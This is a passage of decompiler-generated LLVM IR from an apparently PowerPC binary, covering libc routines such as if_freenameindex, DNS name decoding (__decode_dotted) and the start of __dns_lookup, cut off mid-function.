dec_label_pc_100254c4:                            ; preds = %dec_label_pc_10025494, %dec_label_pc_1002556c
  %v1_1002558024 = phi i32 [ %v1_10025580, %dec_label_pc_1002556c ], [ 0, %dec_label_pc_10025494 ]
  store i32 %v1_10025440, i32* %r0.global-to-local, align 4
  %v2_100254c8 = add i32 %v1_1002558024, %v1_10025440
  store i32 %v2_100254c8, i32* @r30, align 4
  store i32 268588244, i32* @lr, align 4
  %v1_100254d0 = call i32 @__GI_strdup(i32 %v2_100254c8)
  store i32 %v1_100254d0, i32* %r0.global-to-local, align 4
  store i32 35123, i32* @r4, align 4
  %v3_100254e0 = icmp eq i32 %v1_100254d0, 0
  %v0_100254e4 = load i32, i32* @r26, align 4
  store i32 %v0_100254e4, i32* @r3, align 4
  %v0_100254e8 = load i32, i32* @r30, align 4
  store i32 %v0_100254e8, i32* @r5, align 4
  %v1_100254ec = load i32, i32* %r25.global-to-local, align 4
  %v2_100254ec = add i32 %v1_100254ec, 4
  %v3_100254ec = inttoptr i32 %v2_100254ec to i32*
  store i32 %v1_100254d0, i32* %v3_100254ec, align 4
  br i1 %v3_100254e0, label %dec_label_pc_10025504, label %dec_label_pc_100254f4

dec_label_pc_100254f4:                            ; preds = %dec_label_pc_100254c4
  store i32 268588284, i32* @lr, align 4
  %v0_100254f8 = call i32 @ioctl()
  %tmp13 = icmp sgt i32 %v0_100254f8, -1
  br i1 %tmp13, label %dec_label_pc_1002556c, label %dec_label_pc_10025504

dec_label_pc_10025504:                            ; preds = %dec_label_pc_100254f4, %dec_label_pc_100254c4
  %v0_10025504 = call i32 @__errno_location()
  store i32 0, i32* %r29.global-to-local, align 4
  %v1_1002550c = inttoptr i32 %v0_10025504 to i32*
  %v2_1002550c = load i32, i32* %v1_1002550c, align 4
  store i32 %v2_1002550c, i32* @r30, align 4
  store i32 %v0_10025504, i32* %r25.global-to-local, align 4
  %v1_1002552016 = load i32, i32* @r27, align 4
  %v2_1002552017 = icmp eq i32 %v1_1002552016, 0
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1002552819 = load i32, i32* @r28, align 4
  store i32 %v1_1002552819, i32* %r9.global-to-local, align 4
  store i32 1, i32* @r29, align 4
  br i1 %v2_1002552017, label %dec_label_pc_10025534, label %dec_label_pc_10025518

dec_label_pc_10025518:                            ; preds = %dec_label_pc_10025504, %dec_label_pc_10025518
  %v2_1002552820 = phi i32 [ %v2_10025528, %dec_label_pc_10025518 ], [ %v1_1002552819, %dec_label_pc_10025504 ]
  %v1_10025518 = add i32 %v2_1002552820, 4
  %v2_10025518 = inttoptr i32 %v1_10025518 to i32*
  %v3_10025518 = load i32, i32* %v2_10025518, align 4
  store i32 %v3_10025518, i32* @r3, align 4
  store i32 268588320, i32* @lr, align 4
  %v0_1002551c = call i32 @free()
  %v0_10025520.pre = load i32, i32* @r29, align 4
  %v1_10025520 = load i32, i32* @r27, align 4
  %v2_10025520 = icmp ult i32 %v0_10025520.pre, %v1_10025520
  %v1_10025524 = mul i32 %v0_10025520.pre, 8
  store i32 %v1_10025524, i32* %r0.global-to-local, align 4
  %v1_10025528 = load i32, i32* @r28, align 4
  %v2_10025528 = add i32 %v1_10025528, %v1_10025524
  store i32 %v2_10025528, i32* %r9.global-to-local, align 4
  %v1_1002552c = add i32 %v0_10025520.pre, 1
  store i32 %v1_1002552c, i32* @r29, align 4
  br i1 %v2_10025520, label %dec_label_pc_10025518, label %dec_label_pc_10025534

dec_label_pc_10025534:                            ; preds = %dec_label_pc_10025504, %dec_label_pc_10025518
  %v1_10025528.lcssa = phi i32 [ %v1_1002552819, %dec_label_pc_10025504 ], [ %v1_10025528, %dec_label_pc_10025518 ]
  store i32 %v1_10025528.lcssa, i32* @r3, align 4
  store i32 268588348, i32* @lr, align 4
  %v0_10025538 = call i32 @free()
  %v0_1002553c = load i32, i32* @r26, align 4
  store i32 268588356, i32* @lr, align 4
  %v1_10025540 = call i32 @__libc_close(i32 %v0_1002553c)
  %v0_10025544 = load i32, i32* @r30, align 4
  %v3_10025544 = icmp eq i32 %v0_10025544, 22
  br i1 %v3_10025544, label %dec_label_pc_1002554c, label %dec_label_pc_10025554

dec_label_pc_1002554c:                            ; preds = %dec_label_pc_10025534
  br label %dec_label_pc_10025560

dec_label_pc_10025554:                            ; preds = %dec_label_pc_10025534
  %v3_10025554 = icmp eq i32 %v0_10025544, 12
  br i1 %v3_10025554, label %dec_label_pc_1002555c, label %dec_label_pc_10025560

dec_label_pc_1002555c:                            ; preds = %dec_label_pc_10025554
  br label %dec_label_pc_10025560

dec_label_pc_10025560:                            ; preds = %dec_label_pc_10025554, %dec_label_pc_1002554c, %dec_label_pc_1002555c
  %v0_10025564 = phi i32 [ %v0_10025544, %dec_label_pc_10025554 ], [ 38, %dec_label_pc_1002554c ], [ 105, %dec_label_pc_1002555c ]
  store i32 0, i32* @r28, align 4
  %v1_10025564 = load i32, i32* %r25.global-to-local, align 4
  %v2_10025564 = inttoptr i32 %v1_10025564 to i32*
  store i32 %v0_10025564, i32* %v2_10025564, align 4
  br label %dec_label_pc_100255a0

dec_label_pc_1002556c:                            ; preds = %dec_label_pc_100254f4
  %v0_1002556c = load i32, i32* @r30, align 4
  %v1_1002556c = add i32 %v0_1002556c, 16
  %v2_1002556c = inttoptr i32 %v1_1002556c to i32*
  %v3_1002556c = load i32, i32* %v2_1002556c, align 4
  store i32 %v3_1002556c, i32* %r0.global-to-local, align 4
  %v0_10025570 = load i32, i32* @r27, align 4
  %v1_10025570 = add i32 %v0_10025570, 1
  store i32 %v1_10025570, i32* @r27, align 4
  %v1_10025574 = load i32, i32* @r28, align 4
  %v2_10025574 = load i32, i32* @r29, align 4
  %v3_10025574 = add i32 %v2_10025574, %v1_10025574
  %v4_10025574 = inttoptr i32 %v3_10025574 to i32*
  store i32 %v3_1002556c, i32* %v4_10025574, align 4
  %v0_10025578.pre = load i32, i32* @r27, align 4
  %v0_10025584.pre = load i32, i32* @r28, align 4
  %v1_10025578 = load i32, i32* %r24.global-to-local, align 4
  %v2_10025578 = icmp ult i32 %v0_10025578.pre, %v1_10025578
  %v1_1002557c = mul i32 %v0_10025578.pre, 8
  store i32 %v1_1002557c, i32* %r29.global-to-local, align 4
  %v1_10025580 = mul i32 %v0_10025578.pre, 32
  %v2_10025584 = add i32 %v1_1002557c, %v0_10025584.pre
  store i32 %v2_10025584, i32* %r25.global-to-local, align 4
  br i1 %v2_10025578, label %dec_label_pc_100254c4, label %dec_label_pc_1002558c

dec_label_pc_1002558c:                            ; preds = %dec_label_pc_10025494, %dec_label_pc_1002556c
  %v2_10025584.lcssa = phi i32 [ %v0_10025488, %dec_label_pc_10025494 ], [ %v2_10025584, %dec_label_pc_1002556c ]
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10025590 = load i32, i32* @r26, align 4
  %v2_10025594 = add i32 %v2_10025584.lcssa, 4
  %v3_10025594 = inttoptr i32 %v2_10025594 to i32*
  store i32 0, i32* %v3_10025594, align 4
  %v0_10025598 = load i32, i32* %r0.global-to-local, align 4
  %v1_10025598 = load i32, i32* @r28, align 4
  %v2_10025598 = load i32, i32* %r29.global-to-local, align 4
  %v3_10025598 = add i32 %v2_10025598, %v1_10025598
  %v4_10025598 = inttoptr i32 %v3_10025598 to i32*
  store i32 %v0_10025598, i32* %v4_10025598, align 4
  store i32 268588448, i32* @lr, align 4
  %v1_1002559c = call i32 @__libc_close(i32 %v0_10025590)
  br label %dec_label_pc_100255a0

dec_label_pc_100255a0:                            ; preds = %entry, %dec_label_pc_10025560, %dec_label_pc_100254b4, %dec_label_pc_1002549c, %dec_label_pc_1002558c
  %v2_100255a0 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_100255a0, i32* %r11.global-to-local, align 4
  %v0_100255a4 = load i32, i32* @r28, align 4
  %v1_100255a8 = add i32 %v2_100255a0, 4
  %v2_100255a8 = inttoptr i32 %v1_100255a8 to i32*
  %v3_100255a8 = load i32, i32* %v2_100255a8, align 4
  store i32 %v3_100255a8, i32* %r0.global-to-local, align 4
  ret i32 %v0_100255a4

; uselistorder directives
  uselistorder i32 %v1_1002557c, { 1, 0 }
  uselistorder i32 %v2_10025528, { 1, 0 }
  uselistorder i32 %v1_10025524, { 1, 0 }
  uselistorder i32 %v0_10025520.pre, { 2, 0, 1 }
  uselistorder i32 %v1_1002547c, { 1, 0 }
  uselistorder i32 %v3_10025470, { 0, 2, 1 }
  uselistorder i32 %v1_10025448, { 1, 2, 0 }
  uselistorder i32 %v1_10025410, { 1, 0 }
  uselistorder i32 %stack_var_-52.0, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 0, 1, 3, 2 }
  uselistorder i32* %r9.global-to-local, { 0, 4, 1, 2, 3 }
  uselistorder i32* %r29.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32* %r25.global-to-local, { 2, 0, 1, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 13, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 105, { 1, 2, 3, 4, 0 }
  uselistorder i32 ()* @__opensock, { 2, 1, 0 }
  uselistorder label %dec_label_pc_100255a0, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_1002558c, { 1, 0 }
  uselistorder label %dec_label_pc_10025560, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10025534, { 1, 0 }
  uselistorder label %dec_label_pc_10025518, { 1, 0 }
  uselistorder label %dec_label_pc_100254c4, { 1, 0 }
  uselistorder label %dec_label_pc_10025458, { 1, 0 }
}

define i32 @__GI_if_freenameindex(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r30, align 4
  br label %dec_label_pc_100255e0

dec_label_pc_100255d8:                            ; preds = %dec_label_pc_100255f0, %dec_label_pc_100255e0
  store i32 268588508, i32* @lr, align 4
  %v0_100255d8 = call i32 @free()
  %v0_100255dc = load i32, i32* @r31, align 4
  %v1_100255dc = add i32 %v0_100255dc, 8
  br label %dec_label_pc_100255e0

dec_label_pc_100255e0:                            ; preds = %entry, %dec_label_pc_100255d8
  %v0_100255f0 = phi i32 [ %tmp, %entry ], [ %v1_100255dc, %dec_label_pc_100255d8 ]
  store i32 %v0_100255f0, i32* @r31, align 4
  %v1_100255e0 = add i32 %v0_100255f0, 4
  %v2_100255e0 = inttoptr i32 %v1_100255e0 to i32*
  %v3_100255e0 = load i32, i32* %v2_100255e0, align 4
  %v3_100255e4 = icmp eq i32 %v3_100255e0, 0
  store i32 %v3_100255e0, i32* @r3, align 4
  br i1 %v3_100255e4, label %dec_label_pc_100255f0, label %dec_label_pc_100255d8

dec_label_pc_100255f0:                            ; preds = %dec_label_pc_100255e0
  %v1_100255f0 = inttoptr i32 %v0_100255f0 to i32*
  %v2_100255f0 = load i32, i32* %v1_100255f0, align 4
  %v3_100255f4 = icmp eq i32 %v2_100255f0, 0
  br i1 %v3_100255f4, label %dec_label_pc_100255fc, label %dec_label_pc_100255d8

dec_label_pc_100255fc:                            ; preds = %dec_label_pc_100255f0
  %v0_100255fc = load i32, i32* @r30, align 4
  store i32 %v0_100255fc, i32* @r3, align 4
  store i32 268588548, i32* @lr, align 4
  %v0_10025600 = call i32 @free()
  ret i32 %v0_10025600

; uselistorder directives
  uselistorder label %dec_label_pc_100255e0, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %v0_1002561c = call i32 @__asm_mfcr()
  store i32 %v0_1002561c, i32* @r26, align 4
  %v3_10025628 = icmp eq i32 %v0_1002561c, 0
  store i32 %arg2, i32* @r25, align 4
  store i32 %arg3, i32* @r24, align 4
  br i1 %v3_10025628, label %dec_label_pc_100256f0, label %dec_label_pc_10025640

dec_label_pc_10025640:                            ; preds = %entry
  store i32 1, i32* @r23, align 4
  store i32 0, i32* @r27, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_100256cc14 = load i32, i32* @r4, align 4
  %v2_100256cc15 = add i32 %v1_100256cc14, %v0_1002561c
  %v3_100256cc16 = inttoptr i32 %v2_100256cc15 to i8*
  %v4_100256cc17 = load i8, i8* %v3_100256cc16, align 1
  %v5_100256cc18 = zext i8 %v4_100256cc17 to i32
  store i32 %v5_100256cc18, i32* @r31, align 4
  store i1 false, i1* @cr4_eq, align 1
  %v3_100256d420 = icmp eq i8 %v4_100256cc17, 0
  br i1 %v3_100256d420, label %dec_label_pc_100256e0, label %dec_label_pc_10025650

dec_label_pc_10025650:                            ; preds = %dec_label_pc_10025640, %dec_label_pc_100256c8
  %v3_100256d022 = phi i1 [ %v3_100256d0, %dec_label_pc_100256c8 ], [ false, %dec_label_pc_10025640 ]
  %v5_100256cc21 = phi i32 [ %v5_100256cc, %dec_label_pc_100256c8 ], [ %v5_100256cc18, %dec_label_pc_10025640 ]
  br i1 %v3_100256d022, label %dec_label_pc_10025658, label %dec_label_pc_10025654

dec_label_pc_10025654:                            ; preds = %dec_label_pc_10025650
  %v0_10025654 = load i32, i32* @r27, align 4
  %v1_10025654 = add i32 %v0_10025654, 1
  store i32 %v1_10025654, i32* @r27, align 4
  br label %dec_label_pc_10025658

dec_label_pc_10025658:                            ; preds = %dec_label_pc_10025650, %dec_label_pc_10025654
  %v1_10025658 = call i32 @__asm_rlwinm(i32 %v5_100256cc21, i32 0, i32 24, i32 25)
  %v0_1002565c = load i32, i32* @r4, align 4
  %v1_1002565c = add i32 %v0_1002565c, 1
  store i32 %v1_1002565c, i32* @r30, align 4
  %v3_10025660 = icmp eq i32 %v1_10025658, 192
  br i1 %v3_10025660, label %dec_label_pc_10025668, label %dec_label_pc_10025688

dec_label_pc_10025668:                            ; preds = %dec_label_pc_10025658
  %v0_10025668 = load i1, i1* @cr4_eq, align 1
  br i1 %v0_10025668, label %dec_label_pc_10025670, label %dec_label_pc_1002566c

dec_label_pc_1002566c:                            ; preds = %dec_label_pc_10025668
  %v0_1002566c = load i32, i32* @r27, align 4
  %v1_1002566c = add i32 %v0_1002566c, 1
  store i32 %v1_1002566c, i32* @r27, align 4
  br label %dec_label_pc_10025670

dec_label_pc_10025670:                            ; preds = %dec_label_pc_10025668, %dec_label_pc_1002566c
  %v0_10025670 = load i32, i32* @r26, align 4
  %v2_10025670 = add i32 %v0_10025670, %v1_1002565c
  %v3_10025670 = inttoptr i32 %v2_10025670 to i8*
  %v4_10025670 = load i8, i8* %v3_10025670, align 1
  %v5_10025670 = zext i8 %v4_10025670 to i32
  %v1_10025674 = call i32 @__asm_rlwinm(i32 %v5_100256cc21, i32 8, i32 18, i32 23)
  %v0_10025678 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10025678, i32* @r28, align 4
  store i32 0, i32* @r23, align 4
  %v2_10025680 = or i32 %v5_10025670, %v1_10025674
  store i32 %v2_10025680, i32* @r4, align 4
  br label %dec_label_pc_100256c8

dec_label_pc_10025688:                            ; preds = %dec_label_pc_10025658
  %v0_10025688 = load i32, i32* %r11.global-to-local, align 4
  %v2_10025688 = add i32 %v0_10025688, %v5_100256cc21
  store i32 %v2_10025688, i32* @r29, align 4
  %v1_1002568c = add i32 %v2_10025688, 1
  store i32 %v1_1002568c, i32* @r28, align 4
  %v1_10025690 = load i32, i32* @r24, align 4
  %v2_10025690 = icmp ult i32 %v1_1002568c, %v1_10025690
  br i1 %v2_10025690, label %dec_label_pc_10025698, label %dec_label_pc_100256f0

dec_label_pc_10025698:                            ; preds = %dec_label_pc_10025688
  %v0_10025698 = load i32, i32* @r26, align 4
  %v2_10025698 = add i32 %v0_10025698, %v1_1002565c
  store i32 %v2_10025698, i32* @r4, align 4
  %v0_1002569c = load i32, i32* @r25, align 4
  %v2_1002569c = add i32 %v0_1002569c, %v0_10025688
  store i32 %v2_1002569c, i32* @r3, align 4
  store i32 %v5_100256cc21, i32* @r5, align 4
  store i32 268588712, i32* @lr, align 4
  %v0_100256a4 = call i32 @memcpy()
  %v0_100256a8 = load i32, i32* @r30, align 4
  %v2_100256a8 = add i32 %v0_100256a8, %v5_100256cc21
  store i32 %v2_100256a8, i32* @r4, align 4
  %v0_100256ac = load i1, i1* @cr4_eq, align 1
  br i1 %v0_100256ac, label %dec_label_pc_100256b4, label %dec_label_pc_100256b0

dec_label_pc_100256b0:                            ; preds = %dec_label_pc_10025698
  %v0_100256b0 = load i32, i32* @r27, align 4
  %v2_100256b0 = add i32 %v0_100256b0, %v5_100256cc21
  store i32 %v2_100256b0, i32* @r27, align 4
  br label %dec_label_pc_100256b4

dec_label_pc_100256b4:                            ; preds = %dec_label_pc_10025698, %dec_label_pc_100256b0
  %v0_100256b4 = load i32, i32* @r26, align 4
  %v2_100256b4 = add i32 %v0_100256b4, %v2_100256a8
  %v3_100256b4 = inttoptr i32 %v2_100256b4 to i8*
  %v4_100256b4 = load i8, i8* %v3_100256b4, align 1
  %v3_100256b8 = icmp eq i8 %v4_100256b4, 0
  br i1 %v3_100256b8, label %dec_label_pc_100256c4, label %dec_label_pc_100256c0

dec_label_pc_100256c0:                            ; preds = %dec_label_pc_100256b4
  br label %dec_label_pc_100256c4

dec_label_pc_100256c4:                            ; preds = %dec_label_pc_100256b4, %dec_label_pc_100256c0
  %v0_100256c4.off0 = phi i8 [ 0, %dec_label_pc_100256b4 ], [ 46, %dec_label_pc_100256c0 ]
  %v1_100256c4 = load i32, i32* @r25, align 4
  %v2_100256c4 = load i32, i32* @r29, align 4
  %v4_100256c4 = add i32 %v2_100256c4, %v1_100256c4
  %v5_100256c4 = inttoptr i32 %v4_100256c4 to i8*
  store i8 %v0_100256c4.off0, i8* %v5_100256c4, align 1
  %v0_100256c8.pre = load i32, i32* @r28, align 4
  %v0_100256d0.pre.pre = load i32, i32* @r23, align 4
  %v1_100256cc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_100256c8

dec_label_pc_100256c8:                            ; preds = %dec_label_pc_10025670, %dec_label_pc_100256c4
  %v1_100256cc = phi i32 [ %v2_10025680, %dec_label_pc_10025670 ], [ %v1_100256cc.pre, %dec_label_pc_100256c4 ]
  %v0_100256d0.pre = phi i32 [ 0, %dec_label_pc_10025670 ], [ %v0_100256d0.pre.pre, %dec_label_pc_100256c4 ]
  %v0_100256c8 = phi i32 [ %v0_10025678, %dec_label_pc_10025670 ], [ %v0_100256c8.pre, %dec_label_pc_100256c4 ]
  %v0_100256cc.pre = load i32, i32* @r26, align 4
  store i32 %v0_100256c8, i32* %r11.global-to-local, align 4
  %v2_100256cc = add i32 %v1_100256cc, %v0_100256cc.pre
  %v3_100256cc = inttoptr i32 %v2_100256cc to i8*
  %v4_100256cc = load i8, i8* %v3_100256cc, align 1
  %v5_100256cc = zext i8 %v4_100256cc to i32
  store i32 %v5_100256cc, i32* @r31, align 4
  %v3_100256d0 = icmp eq i32 %v0_100256d0.pre, 0
  store i1 %v3_100256d0, i1* @cr4_eq, align 1
  %v3_100256d4 = icmp eq i8 %v4_100256cc, 0
  br i1 %v3_100256d4, label %dec_label_pc_100256dc, label %dec_label_pc_10025650

dec_label_pc_100256dc:                            ; preds = %dec_label_pc_100256c8
  %v0_100256e4.pre.pre = load i32, i32* @r27, align 4
  br i1 %v3_100256d0, label %dec_label_pc_100256f0, label %dec_label_pc_100256e0

dec_label_pc_100256e0:                            ; preds = %dec_label_pc_10025640, %dec_label_pc_100256dc
  %v0_100256e4.pre26 = phi i32 [ %v0_100256e4.pre.pre, %dec_label_pc_100256dc ], [ 0, %dec_label_pc_10025640 ]
  %v1_100256e0 = add i32 %v0_100256e4.pre26, 1
  store i32 %v1_100256e0, i32* @r27, align 4
  br label %dec_label_pc_100256f0

dec_label_pc_100256f0:                            ; preds = %dec_label_pc_10025688, %dec_label_pc_100256dc, %dec_label_pc_100256e0, %entry
  %storemerge1 = phi i32 [ -1, %entry ], [ %v1_100256e0, %dec_label_pc_100256e0 ], [ %v0_100256e4.pre.pre, %dec_label_pc_100256dc ], [ -1, %dec_label_pc_10025688 ]
  %v1_10025704 = call %0 @__asm_mtcrf(i32 8, i32 %v0_1002561c)
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v0_100256e4.pre.pre, { 1, 0 }
  uselistorder i1 %v3_100256d0, { 0, 2, 1 }
  uselistorder i32 %v5_100256cc, { 1, 0 }
  uselistorder i32 %v5_100256cc21, { 5, 4, 0, 3, 2, 1 }
  uselistorder i32 %v0_1002561c, { 1, 0, 2, 3 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3 }
  uselistorder i8 46, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32 23, { 30, 25, 19, 27, 20, 21, 22, 23, 24, 34, 35, 31, 32, 33, 0, 18, 1, 2, 26, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 28, 29 }
  uselistorder i32 18, { 8, 0, 9, 10, 11, 12, 1, 2, 13, 3, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_100256f0, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_100256e0, { 1, 0 }
  uselistorder label %dec_label_pc_100256c8, { 1, 0 }
  uselistorder label %dec_label_pc_100256c4, { 1, 0 }
  uselistorder label %dec_label_pc_100256b4, { 1, 0 }
  uselistorder label %dec_label_pc_10025670, { 1, 0 }
  uselistorder label %dec_label_pc_10025658, { 1, 0 }
  uselistorder label %dec_label_pc_10025650, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  store i32 %arg6, i32* @r8, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %stack_var_-212 = alloca i16, align 2
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-240 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-228 = alloca i32, align 4
  %v0_10025710 = load i32, i32* @lr, align 4
  store i32 %v0_10025710, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r14.global-to-local, align 4
  store i32 512, i32* @r3, align 4
  store i32 %arg2, i32* @r16, align 4
  store i32 %arg3, i32* @r23, align 4
  store i32 268588860, i32* @lr, align 4
  %v0_10025738 = call i32 @malloc()
  store i32 %v0_10025738, i32* @r30, align 4
  store i32 1025, i32* @r3, align 4
  store i32 268588872, i32* @lr, align 4
  %v0_10025744 = call i32 @malloc()
  %v0_10025748 = load i32, i32* @r30, align 4
  %v3_10025748 = icmp eq i32 %v0_10025748, 0
  store i32 %v0_10025744, i32* @r21, align 4
  br i1 %v3_10025748, label %dec_label_pc_10025d04, label %dec_label_pc_10025754

dec_label_pc_10025754:                            ; preds = %entry
  %v3_10025754 = icmp eq i32 %v0_10025744, 0
  br i1 %v3_10025754, label %dec_label_pc_10025d04, label %dec_label_pc_1002575c

dec_label_pc_1002575c:                            ; preds = %dec_label_pc_10025754
  %v0_1002575c = load i32, i32* @r23, align 4
  %v3_1002575c = icmp eq i32 %v0_1002575c, 0
  br i1 %v3_1002575c, label %dec_label_pc_10025d04, label %dec_label_pc_10025764

dec_label_pc_10025764:                            ; preds = %dec_label_pc_1002575c
  %v0_10025764 = load i32, i32* %r14.global-to-local, align 4
  %v1_10025764 = inttoptr i32 %v0_10025764 to i8*
  %v2_10025764 = load i8, i8* %v1_10025764, align 1
  %v3_10025764 = zext i8 %v2_10025764 to i32
  store i32 %v3_10025764, i32* %r0.global-to-local, align 4
  %v3_10025768 = icmp eq i8 %v2_10025764, 0
  br i1 %v3_10025768, label %dec_label_pc_10025d04, label %dec_label_pc_10025770

dec_label_pc_10025770:                            ; preds = %dec_label_pc_10025764
  store i32 %v0_10025764, i32* @r3, align 4
  store i32 268763136, i32* %r29.global-to-local, align 4
  %v0_10025778 = call i32 @__GI_strlen()
  %v0_10025780 = load i32, i32* %r14.global-to-local, align 4
  %v2_10025780 = add i32 %v0_10025780, %v0_10025778
  %v1_10025788 = add i32 %v2_10025780, -1
  %v2_10025788 = inttoptr i32 %v1_10025788 to i8*
  %v3_10025788 = load i8, i8* %v2_10025788, align 1
  %v4_10025788 = zext i8 %v3_10025788 to i32
  store i32 %v4_10025788, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1004db38.1363 to i32), i32* @r29, align 4
  %v2_10025790 = ptrtoint i32* %stack_var_-228 to i32
  store i32 %v2_10025790, i32* @r28, align 4
  store i32 -1, i32* @r19, align 4
  %v4_100257a4 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-228, i32 268527832, i32 ptrtoint (i32* @global_var_1004db38.1363 to i32))
  %v0_100257a8 = load i32, i32* @r29, align 4
  store i32 268588980, i32* @lr, align 4
  %v1_100257b0 = call i32 @pthread_mutex_lock(i32 %v0_100257a8)
  %v3_100257b8 = load i32, i32* @global_var_10045268.1364, align 4
  store i32 %v3_100257b8, i32* %r11.global-to-local, align 4
  %v3_100257c0 = load i16, i16* @global_var_10045064.1365, align 2
  %v4_100257c0 = zext i16 %v3_100257c0 to i32
  store i32 %v4_100257c0, i32* @r25, align 4
  store i32 %v2_10025790, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 0, i32* @r17, align 4
  %v1_100257d0 = load i32, i32* @r23, align 4
  store i32 0, i32* @r18, align 4
  store i32 -1, i32* @r22, align 4
  %v2_100257d0 = srem i32 %v3_100257b8, %v1_100257d0
  %v2_100257dc = sub i32 %v3_100257b8, %v2_100257d0
  store i32 %v2_100257dc, i32* %r0.global-to-local, align 4
  store i32 %v2_100257d0, i32* @r26, align 4
  store i32 ptrtoint (i32* @global_var_100257e8.1366 to i32), i32* @lr, align 4
  %v0_100257e4 = call i32 @__pthread_cleanup_pop_restore()
  %v0_10025cf8.pr19 = load i32, i32* @r18, align 4
  %tmp57 = icmp ult i32 %v0_10025cf8.pr19, 3
  br i1 %tmp57, label %dec_label_pc_100257ec.lr.ph.lr.ph, label %dec_label_pc_10025d10

dec_label_pc_100257ec.lr.ph.lr.ph:                ; preds = %dec_label_pc_10025770
  %v2_10025804 = ptrtoint i32* %stack_var_-144 to i32
  %v2_10025918 = ptrtoint i32* %stack_var_-204 to i32
  %v2_10025978 = ptrtoint i16* %stack_var_-212 to i32
  %v2_100259bc = ptrtoint i32* %stack_var_-248 to i32
  %v3_10025a18 = icmp eq i32 %tmp37, 0
  %v3_10025a24 = icmp eq i32 %tmp36, 3
  %v2_10025aa0 = icmp sgt i32 %tmp35, 0
  %tmp58 = icmp slt i32 %tmp35, 1
  %v2_10025af4 = ptrtoint i32* %stack_var_-184 to i32
  %v3_10025b20 = icmp eq i32 %tmp33, 0
  %v3_10025a94 = icmp eq i32 %tmp36, 0
  br label %dec_label_pc_100257ec.lr.ph

dec_label_pc_100257ec:                            ; preds = %dec_label_pc_100257ec.lr.ph, %dec_label_pc_1002599c
  %v0_100257ec = load i32, i32* @r19, align 4
  %v3_100257ec = icmp eq i32 %v0_100257ec, -1
  br i1 %v3_100257ec, label %dec_label_pc_100257fc, label %dec_label_pc_100257f4

dec_label_pc_100257f4:                            ; preds = %dec_label_pc_100257ec
  store i32 268589052, i32* @lr, align 4
  %v1_100257f8 = call i32 @__libc_close(i32 %v0_100257ec)
  br label %dec_label_pc_100257fc

dec_label_pc_100257fc:                            ; preds = %dec_label_pc_100257ec, %dec_label_pc_100257f4
  store i32 0, i32* @r4, align 4
  store i32 512, i32* @r5, align 4
  store i32 %v2_10025804, i32* @r29, align 4
  %v0_10025808 = load i32, i32* @r30, align 4
  store i32 %v0_10025808, i32* @r3, align 4
  store i32 268589072, i32* @lr, align 4
  %v0_1002580c = call i32 @__GI_memset()
  store i32 0, i32* @r4, align 4
  store i32 48, i32* @r5, align 4
  store i32 %v2_10025804, i32* @r3, align 4
  store i32 268589088, i32* @lr, align 4
  %v0_1002581c = call i32 @__GI_memset()
  %v0_10025820 = load i32, i32* @r25, align 4
  %v1_10025820 = add i32 %v0_10025820, 1
  %v1_10025824 = urem i32 %v1_10025820, 65536
  store i32 %v1_10025824, i32* @r25, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10025830 = load i32, i32* @r30, align 4
  store i32 %v1_10025824, i32* %stack_var_-144, align 4
  %v4_10025844 = call i32 @__encode_header(i32* nonnull %stack_var_-144, i32 %v0_10025830, i32 512)
  store i32 %v4_10025844, i32* @r28, align 4
  %v1_10025848 = icmp slt i32 %v4_10025844, 0
  br i1 %v1_10025848, label %dec_label_pc_10025d10, label %dec_label_pc_10025850

dec_label_pc_10025850:                            ; preds = %dec_label_pc_100257fc
  %v0_10025850 = load i32, i32* %r14.global-to-local, align 4
  store i32 %v0_10025850, i32* @r4, align 4
  %v0_10025858 = load i32, i32* @r21, align 4
  store i32 268697600, i32* %r29.global-to-local, align 4
  store i32 268589156, i32* @lr, align 4
  %v4_10025860 = call i32 @strncpy(i32 %v0_10025858, i32 %v0_10025850, i32 1025)
  store i32 ptrtoint (i32* @global_var_10045068.1211 to i32), i32* %r29.global-to-local, align 4
